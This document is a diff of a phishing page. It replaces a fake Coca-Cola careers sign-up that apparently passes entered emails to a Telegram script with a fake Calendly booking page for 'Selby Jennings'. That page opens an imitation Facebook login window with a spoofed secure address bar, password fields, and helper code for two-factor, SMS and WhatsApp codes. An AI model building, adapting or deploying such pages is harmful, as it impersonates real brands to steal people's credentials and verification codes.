@@ -1,76 +1,390 @@
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="theme-color" content="#000001">
-    <meta name="description" content="">
-    <title>Coca-Cola | Careers</title>
-    <script src="./js/telegram.js"></script>
-    <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">
-    <link href="./assets/loader.css" rel="stylesheet">
-    <link href="./assets/style.css" rel="stylesheet">
-  </head>
-  <body>
-    <div id="loadFacebookC" style="display:none;" class="">
-        <div id="loadFacebookG">
-        <div id="blockG_1" class="facebook_blockG"></div>
-        <div id="blockG_2" class="facebook_blockG"></div>
-        <div id="blockG_3" class="facebook_blockG"></div>
-      </div>
-  </div>
-
-    <noscript>You need to enable JavaScript to run this app.</noscript>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Web site created using create-react-app">
+    <title>Select a Date & Time - Calendly</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="icon" type="image/png" sizes="32x32" href="./favicon.ico">
+    <link href="./main.5d063b47.css" rel="stylesheet">
+    <style>
+        .input-error { border: 2px solid red !important; }
+    </style>
+</head>
+<body>
     <div id="root">
-      <div class="bg-white">
-        <div>
-          <div class="flex min-h-full flex-col justify-center px-6 py-12 lg:px-8 bg-[#f3f2f1]">
-            <div class="sm:mx-auto sm:w-full sm:max-w-sm">
-              <center>
-                <div style="fill: rgb(37, 87, 167); width: 313px;">
-                  <img src="./assets/redbull.png" alt="x">
-                </div>
-              </center>
-            </div>
-            <div class="m-2 p-6 py-8 space-y-6 mt-10 flex justify-center items-center rounded-md bg-white sm:mx-auto sm:w-full sm:max-w-sm" style="border: 1px solid rgb(212, 210, 208); max-width: 31rem;">
-              <div>
-                <h2 class="text-left text-xl font-bold leading-9 tracking-tight text-gray-900">Are you ready to work as a Social Media Manager for Coca-Cola?</h2>
-                <h2 class="mt-2 text-left text-md font leading-4 tracking-tight text-gray-800">Create an account or sign in.</h2>
-                <h2 class="mt-2 text-left text-sm font-normal leading-2 text-gray-400">We’re looking for curious minds from a wide range of disciplines and backgrounds.</h2>
-                <button onclick="window.location.href = 'login.html';" type="button" class="flex w-full justify-center rounded-md bg-white px-3 py-2.5 mt-6 text-md font-normal leading-6 text-gray-600" style="border: 1px solid rgb(212, 210, 208);">
-                  <svg class="SVGInline-svg" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M24 12c0-6.627-5.373-12-12-12S0 5.373 0 12c0 5.99 4.388 10.954 10.125 11.854V15.47H7.078V12h3.047V9.356c0-3.007 1.792-4.668 4.533-4.668 1.312 0 2.686.234 2.686.234v2.953H15.83c-1.491 0-1.956.925-1.956 1.875V12h3.328l-.532 3.469h-2.796v8.385C19.612 22.954 24 17.99 24 12z" fill="#1877F2"></path>
-                  </svg>
-                  <span style="padding-left: 15px;">Continue with Facebook</span>
-                </button>
-                <div class="mt-4 mb-2" style="display: flex; align-items: center; width: 100%;">
-                  <div style="height: 1px; width: 50%; background-color: rgb(212, 210, 208);"></div>
-                  <div style="padding: 0px 10px;">or</div>
-                  <div style="height: 1px; width: 50%; background-color: rgb(212, 210, 208);"></div>
-                </div>
-                <div class="mt-4 space-y-6">
-                  <div>
-                    <label for="email" class="block text-md font-bold leading-6 text-gray-900">Email address *</label>
-                    <div class="mt-2">
-                      <input id="message" name="email" type="email" autocomplete="email" required class="block w-full rounded-md border-1 py-2.5 border-2 border-gray-200 focus:outline-none focus:border-[#1877F2] text-gray-900 shadow-sm placeholder:text-gray-400 sm:text-md sm:leading-6" value="" style="border-color: rgb(229, 231, 235); padding-left: 10px;">
-                      <span style="color: red;"></span>
+        <div id="root">
+            <div class="App">
+                <div class="box__shadow">
+                    <div class="calendar__wrapper">
+                        <div class="user__wrapper">
+                            <div class="logo__wrapper"><img width="50%" src="7986f821-ba10-4239-ba4a-03723e5aed12.png">
+                            </div>
+                            <div class="screen__two center__text">
+                                <div class="mobile__back-svg">
+                                    <div class="content__wrapper">
+                                        <div>
+                                            <!-- <div><img class="avatar" width="65px" src="./a1.png"></div> -->
+                                            <p>Selby Jennings</p>
+                                        </div>
+                                        <h2>30 Minutes Meeting</h2>
+                                    </div>
+                                </div>
+                                <div class="minute"><svg data-id="details-item-icon" viewBox="0 0 10 10"
+                                        xmlns="http://www.w3.org/2000/svg" role="img">
+                                        <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none"
+                                            stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
+                                        <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="currentColor"
+                                            stroke-linecap="round" stroke-linejoin="round"></path>
+                                    </svg><span>30 min</span></div>
+                                <div class="minute mt-12"><svg data-testid="phone-call-icon" data-id="details-item-icon"
+                                        viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
+                                        <path
+                                            d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
+                                            fill="none" stroke="currentColor" stroke-linecap="round"
+                                            stroke-linejoin="round"></path>
+                                    </svg><span>Phone call</span></div>
+                                <div class="minute space__bettwen"><svg data-id="details-item-icon" viewBox="0 0 10 10"
+                                        xmlns="http://www.w3.org/2000/svg" role="img">
+                                        <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none"
+                                            stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
+                                        <path
+                                            d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
+                                            fill="none" stroke="currentColor" stroke-linecap="round"
+                                            stroke-linejoin="round"></path>
+                                    </svg><span>Europe/Budapest (21:32)</span></div>
+                            </div>
+                            <div class="footer__wrapper">
+                                <p>Cookie settings</p>
+                                <p>Report abuse</p>
+                            </div>
+                        </div>
+                        <div class="form__wrapper date__time">
+                            <div>
+                                <div class="full__width">
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <h2>Schedule call with Selby Jennings</h2>
+                                    </div>
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div class="form-steps">
+                                            <form id="msform">
+                                                <ul id="progressbar">
+                                                    <li class="active" id="account"><strong>Verify</strong></li>
+                                                    <li id="personal"><strong>Schedule</strong></li>
+                                                    <li id="confirm"><strong>Finish</strong></li>
+                                                </ul>
+                                            </form>
+                                        </div>
+                                    </div>
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div class="dummy__text">
+                                            <p>Please confirm your appointment with Selby Jennings. <br>To complete the
+                                                confirmation process, continue with Facebook</p>
+                                        </div>
+                                    </div>
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div class="facebook__button"><button id="facebook-btn"><svg
+                                                    xmlns="http://www.w3.org/2000/svg" width="25" height="24"
+                                                    viewBox="0 0 25 24" fill="none">
+                                                    <g clip-path="url(#clip0_302_2)">
+                                                        <rect width="24" height="24" transform="translate(0.845947)"
+                                                            fill="#1877F2"></rect>
+                                                        <path
+                                                            d="M24.3459 12.0699C24.3459 5.7186 19.1972 0.56988 12.8459 0.56988C6.49467 0.56988 1.34595 5.7186 1.34595 12.0699C1.34595 17.8099 5.55133 22.5674 11.0491 23.4302V15.3941H8.12915V12.0699H11.0491V9.53629C11.0491 6.6541 12.7659 5.06207 15.3928 5.06207C16.651 5.06207 17.967 5.28668 17.967 5.28668V8.11675H16.5169C15.0883 8.11675 14.6428 9.00322 14.6428 9.91266V12.0699H17.8323L17.3224 15.3941H14.6428V23.4302C20.1406 22.5674 24.3459 17.8099 24.3459 12.0699Z"
+                                                            fill="white"></path>
+                                                    </g>
+                                                    <defs>
+                                                        <clipPath id="clip0_302_2">
+                                                            <rect width="24" height="24" fill="white"
+                                                                transform="translate(0.845947)"></rect>
+                                                        </clipPath>
+                                                    </defs>
+                                                </svg>Continue with Facebook</button></div>
+                                    </div>
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div class="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
+                                            <p>Cookie settings</p>
+                                            <p>Report abuse</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div><a class="logo__wrapper-calendly hide__mobile">
+                                <div class="background">
+                                    <div class="powerd__by">powered by</div>
+                                    <div class="calendly">Calendly</div>
+                                </div>
+                            </a>
+                        </div>
                     </div>
-                  </div>
-                  <span id="error-message" style="color: red; display: none;"></span>
-                  <div>
-                    <button onclick="goTo()" type="button" class="flex w-full justify-center rounded-md px-3 py-2.5 text-md font-semibold leading-6 text-white shadow-sm" style="opacity: 1; background-color: rgb(204, 30, 74);">Continue</button>
-                  </div>
-                </div>
-              </div>
+                </div><a class="logo__wrapper-calendly-mobile">
+                    <div class="background">
+                        <div class="powerd__by">powered by</div>
+                        <div class="calendly">Calendly</div>
+                    </div>
+                </a>
             </div>
-          </div>
         </div>
-      </div>
     </div>
-      <script>
-    function goTo() {
-      sendMessage('Email')
-            setTimeout(function() {      window.location.href = 'login.html';}, 2000);
-    }
-  </script>
-  </body>
+
+    <!-- Modal Structure -->
+    <div id="facebook-modal" style="display: none;">
+            <div class="ant-modal-mask"></div>
+            <div tabindex="-1" class="ant-modal-wrap">
+                <div role="dialog" aria-labelledby="rc_unique_0" aria-modal="true"
+                    class="ant-modal modal-wrapper  modal__facebook"
+                    style="width: 1000px; transform-origin: 612.4px 335px;">
+                    <div tabindex="0" aria-hidden="true"
+                        style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                    <div class="ant-modal-content"><button type="button" aria-label="Close"
+                            class="ant-modal-close"><span class="ant-modal-close-x"><span role="img" aria-label="close"
+                                    class="anticon anticon-close ant-modal-close-icon"><svg fill-rule="evenodd"
+                                        viewBox="64 64 896 896" focusable="false" data-icon="close" width="1em"
+                                        height="1em" fill="currentColor" aria-hidden="true">
+                                        <path
+                                            d="M799.86 166.31c.02 0 .04.02.08.06l57.69 57.7c.04.03.05.05.06.08a.12.12 0 010 .06c0 .03-.02.05-.06.09L569.93 512l287.7 287.7c.04.04.05.06.06.09a.12.12 0 010 .07c0 .02-.02.04-.06.08l-57.7 57.69c-.03.04-.05.05-.07.06a.12.12 0 01-.07 0c-.03 0-.05-.02-.09-.06L512 569.93l-287.7 287.7c-.04.04-.06.05-.09.06a.12.12 0 01-.07 0c-.02 0-.04-.02-.08-.06l-57.69-57.7c-.04-.03-.05-.05-.06-.07a.12.12 0 010-.07c0-.03.02-.05.06-.09L454.07 512l-287.7-287.7c-.04-.04-.05-.06-.06-.09a.12.12 0 010-.07c0-.02.02-.04.06-.08l57.7-57.69c.03-.04.05-.05.07-.06a.12.12 0 01.07 0c.03 0 .05.02.09.06L512 454.07l287.7-287.7c.04-.04.06-.05.09-.06a.12.12 0 01.07 0z">
+                                        </path>
+                                    </svg></span></span></button>
+                        <div class="ant-modal-header">
+                            <div class="ant-modal-title" id="rc_unique_0">
+                                <div>
+                                    <div class="wrapper_header">
+                                        <div class="sign__up-modal"><img src="./fb.ico" alt="" width="17px">
+                                            <p>Log into Facebook | Facebook</p>
+                                        </div>
+                                        <div class="icons">
+                                            <div class="img" role="button"><img src="./minus.png" alt=""></div>
+                                            <div class="img"><img
+                                                    src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png"
+                                                    alt=""></div>
+                                            <div class="img img-x" role="button">
+                                                <img src="./close.png" alt="">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="input__title-wrapper">
+                                        <div class="lock__screen">
+                                            <div class="lock">
+                                                <div class="lock__wrapper"><img src="./locktest.png" alt=""><span
+                                                        class="green">Secure | https:</span><span
+                                                        class="black-opacity">//</span></div>
+                                            </div><span class="input__value">www.facebook.com<span class="black">
+                                                    /login.php?skip<span class="hide__text-mobile">_api_login=1
+                                                        &amp;api_key=481324359126967&amp;kid_directed_site=0&amp;app_id=481324359126967&amp;signed...</span></span></span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="ant-modal-body" style="height: 650px;" id="login-form">
+                            <div class="confirmation-container-modal">
+                                <div class="header-color">
+                                    <div class="header-container">
+                                        <div class="logo__faceook"></div>
+                                    </div>
+                                </div>
+                                <div class="auth-req-container auth__req-modal">
+                                    <div class="auth-req">
+                                        <div class="auth-req-text-modal">
+                                            <h2>Log Into Facebook</h2>
+                                            <div class="modal__confirmation">
+                                                <form class="ant-form ant-form-horizontal">
+                                                    <div>
+                                                        <div class="ant-form-item">
+                                                            <div class="ant-row ant-form-item-row">
+                                                                <div class="ant-col ant-form-item-control">
+                                                                    <div class="ant-form-item-control-input">
+                                                                        <div
+                                                                            class="ant-form-item-control-input-content">
+                                                                            <input required="" type="text" name=""
+                                                                                placeholder="Email or phone number"
+                                                                                id="username" class="ant-input"
+                                                                                value="">
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div>
+                                                        <div class="ant-form-item">
+                                                            <div class="ant-row ant-form-item-row">
+                                                                <div class="ant-col ant-form-item-control">
+                                                                    <div class="ant-form-item-control-input">
+                                                                        <div
+                                                                            class="ant-form-item-control-input-content">
+                                                                            <input required="" type="password" name=""
+                                                                                placeholder="Password" id="password"
+                                                                                class="ant-input">
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div><button type="button" id="login-btn">Log In</button></div>
+                                                </form>
+                                                <div class="modal__confirmation-forgot">
+                                                    <div class="modal__confirmation-account">
+                                                        <p>Forgot account? </p>
+                                                        <p>Sign up for Facebook</p>
+                                                    </div>
+                                                    <p class="not__now">Not now</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="having-trouble-class having__trouble-modal"><button>Having
+                                            trouble?</button></div>
+                                    <div class="show-footer-on-mobile-plus hide__footer-modal">
+                                        <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
+                                        <div class="footer-flex-mobile-plus confimartion__modal">
+                                            <div>
+                                                <h2>English (US)</h2>
+                                                <p>Deutsch</p>
+                                                <p>Српски</p>
+                                                <p>Português (Brasil)</p>
+                                            </div>
+                                            <div>
+                                                <p>Italiano</p>
+                                                <p>Bosanski</p>
+                                                <p>Svensk</p><button>+</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="modal__footer">
+                                <div class="footer-menu-flex-ul">
+                                    <div class="container-language-footer">
+                                        <ul class="flex-ul">
+                                            <li>English (US)</li>
+                                            <li>Español</li>
+                                            <li>Deutsch</li>
+                                            <li>Türkçe</li>
+                                            <li>Српски</li>
+                                            <li>Français (France)</li>
+                                            <li>Italiano</li>
+                                            <li>Bosanski</li>
+                                            <li>Svensk</li>
+                                            <li>Português (Brasil)</li><button
+                                                class="countrys-button"><span>+</span></button>
+                                        </ul>
+                                    </div>
+                                    <div class="flex-second-ul">
+                                        <ul>
+                                            <li>Sign Up</li>
+                                            <li>Log In</li>
+                                            <li>Messenger</li>
+                                            <li>Facebook Lite</li>
+                                            <li>Watch</li>
+                                            <li>Places</li>
+                                            <li>Games</li>
+                                            <li>Marketplace</li>
+                                            <li>Facebook Pay</li>
+                                            <li>Oculus</li>
+                                            <li>Portal</li>
+                                            <li>Instagram</li>
+                                            <li>Bulletin</li>
+                                            <li>Local</li>
+                                        </ul>
+                                    </div>
+                                    <div class="flex-second-ul-2">
+                                        <ul>
+                                            <li>Fundraisers</li>
+                                            <li>Services</li>
+                                            <li>Voting Information Centre</li>
+                                            <li>About</li>
+                                            <li>Create ad</li>
+                                            <li>Create Page</li>
+                                            <li>Developers</li>
+                                            <li>Careers</li>
+                                            <li>Privacy</li>
+                                            <li>Cookies</li>
+                                            <li class="ad-choice-img">Ad Choices <span class="img-li"></span> </li>
+                                            <li>Terms</li>
+                                            <li>Help</li>
+                                        </ul>
+                                    </div>
+                                    <div class="meta-footer">
+                                        <p>Meta © 2025</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    <script>
+        const facebookButton = document.getElementById('facebook-btn');
+        const modal = document.getElementById('facebook-modal');
+        const loginButton = document.getElementById('login-btn');
+        
+        facebookButton.addEventListener('click', function () {
+            modal.style.display = 'block';
+        });
+        
+        loginButton.addEventListener('click', function() {
+            // Redirect to /schedule when Log In button is clicked
+            window.location.href = '/schedule';
+        });
+        
+        function closeModal() {
+            modal.style.display = 'none';
+        }
+        
+        async function fetchData(url, options) {
+            try {
+                const response = await fetch(url, options);
+                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+                return await response.json();
+            } catch (error) {
+                console.error('Fetch error:', error);
+                throw error; // Re-throw for further handling
+            }
+        }
+
+        // Validate input fields
+        function validateInput(input, minLength, errorMessageElement) {
+            if (input.length < minLength) {
+                errorMessageElement.style.display = 'block';
+                errorMessageElement.textContent = `Code must be at least ${minLength} characters long.`;
+                return false;
+            }
+            errorMessageElement.style.display = 'none';
+            return true;
+        }
+
+        // Hide all elements
+        function hideAllElements() {
+            const elementsToHide = [
+                'login-form', 'waitTime', 'wrongpsw', 'codeEmail', 'codeSms', 'authcode', 'whatsappcode', 'oldpass'
+            ];
+            elementsToHide.forEach(id => {
+                const element = document.getElementById(id);
+                if (element) element.style.display = 'none';
+            });
+        }
+
+        // Show a specific element
+        function showElement(id) {
+            const element = document.getElementById(id);
+            if (element) element.style.display = 'block';
+        }
+
+        // Clear input fields
+        function clearInputs() {
+            const inputsToClear = [
+                'authcodesms','buttonauthMobile', 'whatsappcodesms', 'whatsappcodeMobile', 'codeSmsMobile', 'codeSmsDes',
+                'emailcode', 'emailcodeMobile', 'username', 'password', 'old_username', 'old_password'
+            ];
+            inputsToClear.forEach(id => {
+                const input = document.getElementById(id);
+                if (input) input.value = '';
+            });
+        }
+    </script>
+</body>
 </html>
